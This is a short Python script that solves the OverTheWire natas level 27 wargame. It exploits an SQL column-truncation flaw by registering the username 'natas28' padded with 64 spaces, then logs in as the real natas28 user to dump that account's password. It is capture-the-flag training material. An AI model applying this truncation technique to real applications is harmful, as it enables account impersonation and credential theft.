"""
Help script to resolve natas challenge #27
"""
import requests
import json

level = 'natas27'
url = 'http://{}.natas.labs.overthewire.org'.format(level)

with open('natas.json') as j:
    credentials = json.load(j)
auth = (level, credentials[level])
del credentials

"""
In this level we will exploit an SQL truncation issue.
We might exceed the length of a given field. In this case,
SQL will truncate it.
In this way, we can introduce a value that will collide with the
legitimate ones and appear in statements where it shouldn't.
"""
session = requests.Session()
"""
We will exploit the query in the dumpData function and leverage the 'if'
statement that checks the length of the result set.
    function dumpData($link,$usr){
        
        $user=mysql_real_escape_string($usr);
        
        $query = "SELECT * from users where username='$user'";
        $res = mysql_query($query, $link);
        if($res) {
            if(mysql_num_rows($res) > 0) {  // <-----This statement
                while ($row = mysql_fetch_assoc($res)) {
                    return print_r($row,true);
                }
            }
        }
        return False;
    }

As we will try to dump the data from natas28, let's inject a user called "natas28 <64 spaces>something"
"""
session.post(url, data={'username': 'natas28' + ' '*64 + 'doesnotmatter', 'password': 'something'}, auth=auth)
# Now we can dump everything only with the credentials of the new user.
response = session.post(url, data={'username': 'natas28', 'password': 'something'}, auth=auth)
print(response.text)
